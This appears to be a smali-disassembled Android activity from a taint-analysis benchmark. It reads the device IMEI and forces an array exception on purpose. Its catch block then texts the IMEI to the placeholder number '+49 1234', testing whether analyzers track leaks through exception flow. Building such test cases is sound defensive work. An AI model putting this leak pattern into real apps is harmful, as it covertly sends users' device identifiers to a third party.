.class public Lde/ecspride/Exceptions2;
.super Landroid/app/Activity;
.source "Exceptions2.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 20
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v2, 0x0

    .line 24
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 25
    const/high16 v1, 0x7f030000

    invoke-virtual {p0, v1}, Lde/ecspride/Exceptions2;->setContentView(I)V

    .line 27
    const-string v3, ""

    .line 29
    .local v3, "imei":Ljava/lang/String;
    :try_start_0
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Lde/ecspride/Exceptions2;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/telephony/TelephonyManager;

    .line 30
    .local v8, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v3

    .line 31
    const-wide v4, 0x4048800000000000L    # 49.0

    invoke-static {v4, v5}, Ljava/lang/Math;->sqrt(D)D

    move-result-wide v4

    double-to-int v1, v4

    new-array v6, v1, [I

    .line 32
    .local v6, "arr":[I
    const/16 v1, 0x20

    aget v1, v6, v1

    if-lez v1, :cond_0

    .line 33
    const-string v3, ""
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    .line 39
    .end local v6    # "arr":[I
    .end local v8    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :cond_0
    :goto_0
    return-void

    .line 35
    :catch_0
    move-exception v7

    .line 36
    .local v7, "ex":Ljava/lang/RuntimeException;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 37
    .local v0, "sm":Landroid/telephony/SmsManager;
    const-string v1, "+49 1234"

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0
.end method
